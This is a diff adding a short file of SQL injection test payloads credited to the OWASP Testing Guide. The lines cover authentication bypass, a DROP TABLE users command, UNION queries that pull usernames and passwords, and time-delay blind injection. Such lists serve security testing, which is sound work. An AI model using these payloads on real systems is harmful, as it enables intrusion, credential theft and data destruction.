@@ -1,0 +1,13 @@
+# SQL injection test payloads — one per line
+# Source: OWASP Testing Guide
+
+' OR '1'='1
+' OR 1=1--
+1; DROP TABLE users--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+' AND 1=2 UNION SELECT username,password FROM users--
+1 AND SLEEP(5)--
+1'; WAITFOR DELAY '0:0:5'--
+' OR BENCHMARK(5000000,MD5(1))--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
